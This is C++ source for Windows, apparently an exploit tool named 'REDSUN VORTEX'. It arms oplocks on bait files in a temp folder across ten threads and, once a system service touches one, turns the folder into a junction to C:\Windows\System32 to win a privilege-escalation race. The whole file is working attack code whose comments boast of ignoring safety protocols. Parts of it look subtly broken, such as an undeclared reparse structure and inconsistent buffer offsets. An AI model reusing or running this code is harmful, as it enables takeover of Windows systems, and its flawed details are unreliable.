#include <Windows.h>
#include <winioctl.h>
#include <iostream>
#include <vector>
#include <thread>
#include <string>

#pragma comment(lib, "ntdll.lib")

// The raw math Big Davey was scared of
#define REPARSE_MOUNTPOINT_HEADER_SIZE 8

// Force a junction flip with zero regard for "safety protocols"
bool ForceJunction(const std::wstring& dir, const std::wstring& target) {
    HANDLE hDir = CreateFileW(dir.c_str(), GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);

    if (hDir == INVALID_HANDLE_VALUE) return false;

    std::wstring ntTarget = L"\\??\\" + target;
    DWORD targetByteLen = (DWORD)(ntTarget.length() * sizeof(wchar_t));
    DWORD bufSize = FIELD_OFFSET(REPARSE_DATA_BUFFER, MountPointReparseBuffer.PathBuffer) + targetByteLen + 4;

    auto buffer = std::unique_ptr<BYTE[]>(new BYTE[bufSize]);
    PREPARSE_DATA_BUFFER rdb = reinterpret_cast<PREPARSE_DATA_BUFFER>(buffer.get());

    rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    rdb->ReparseDataLength = (USHORT)(targetByteLen + 12);
    rdb->MountPointReparseBuffer.SubstituteNameLength = (USHORT)targetByteLen;
    rdb->MountPointReparseBuffer.PrintNameOffset = (USHORT)(targetByteLen + 2);

    memcpy(rdb->MountPointReparseBuffer.PathBuffer, ntTarget.c_str(), targetByteLen);
    DWORD bytesReturned;
    BOOL success = DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, rdb, bufSize, NULL, 0, &bytesReturned, NULL);

    CloseHandle(hDir);
    return success;
}

// The Threaded Trap
void ArmTrap(int id, std::wstring workDir) {
    std::wstring baitFile = workDir + L"\\vortex_bait_" + std::to_wstring(id) + L".tmp";

    HANDLE hBait = CreateFileW(baitFile.c_str(), GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, CREATE_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);

    if (hBait == INVALID_HANDLE_VALUE) return;

    OVERLAPPED ov = { 0 };
    ov.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);

    // Requesting the Level 1 Oplock (The Pause)
    DeviceIoControl(hBait, FSCTL_REQUEST_OPLOCK_LEVEL_1, NULL, 0, NULL, 0, NULL, &ov);

    // This thread hangs here until a system service bites the bait
    if (WaitForSingleObject(ov.hEvent, INFINITE) == WAIT_OBJECT_0) {
        printf("[!] THREAD %d: TRIGGERED! System service is frozen. Swapping...\n", id);

        CloseHandle(hBait);
        DeleteFileW(baitFile.c_str());

        if (ForceJunction(workDir, L"C:\\Windows\\System32")) {
            printf("[+++] THREAD %d: PIVOT COMPLETE. REDSUN ACTIVE.\n", id);
            exit(0); // Exit once we win the race
        }
    }

    CloseHandle(ov.hEvent);
}

int main() {
    printf("[*] INITIALIZING REDSUN VORTEX - MULTI-THREADED RACE ENGINE\n");

    wchar_t tmp[MAX_PATH];
    GetTempPathW(MAX_PATH, tmp);
    std::wstring workDir = std::wstring(tmp) + L"Redsun_Vortex";
    CreateDirectoryW(workDir.c_str(), NULL);

    // Launch 10 parallel threads to catch any possible service interaction
    std::vector<std::thread> threads;
    for (int i = 0; i < 10; i++) {
        threads.emplace_back(ArmTrap, i, workDir);
    }

    printf("[*] 10 OPLOCKS ARMED. Waiting for system interaction...\n");

    for (auto& t : threads) {
        t.join();
    }

    return 0;
}
